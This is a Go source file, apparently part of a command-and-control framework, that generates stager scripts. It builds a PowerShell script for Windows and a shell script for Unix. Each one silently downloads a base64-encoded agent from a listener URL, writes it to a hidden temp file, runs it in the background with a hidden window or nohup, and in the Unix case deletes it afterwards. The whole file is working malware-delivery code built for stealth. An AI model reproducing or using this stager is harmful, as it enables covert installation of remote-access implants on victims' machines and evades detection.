package payload

import "strings"

// buildScript renders a text stager. The stage endpoint's b64 rendering is a
// one-time, short-TTL fetch over the listener's origin (TLS), so the script
// itself only carries the URL and no agent bytes.
func buildScript(osName, stageURL string) string {
	u := strings.ReplaceAll(stageURL+"?b64=1", "'", "''")
	if osName == "windows" {
		return `$ErrorActionPreference='SilentlyContinue'
$u='` + u + `'
$p=Join-Path ([IO.Path]::GetTempPath()) ('.'+[guid]::NewGuid().ToString('N')+'.exe')
try {
  $w=New-Object Net.WebClient
  $b=$w.DownloadString($u)
  [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($b))
  Start-Process -FilePath $p -WindowStyle Hidden
} catch {}
`
	}
	return `#!/bin/sh
u='` + u + `'
p="${TMPDIR:-/tmp}/.$(date +%s).$$"
f="$p.b64"
if command -v curl >/dev/null 2>&1; then curl -fsSL "$u" -o "$f" || exit 0
else wget -qO "$f" "$u" || exit 0
fi
if command -v openssl >/dev/null 2>&1; then openssl base64 -d -A -in "$f" -out "$p" || { rm -f "$f"; exit 0; }
else base64 -d "$f" > "$p" || { rm -f "$f"; exit 0; }
fi
rm -f "$f"
chmod +x "$p"
nohup "$p" >/dev/null 2>&1 &
( sleep 2; rm -f "$p" ) >/dev/null 2>&1 &
`
}
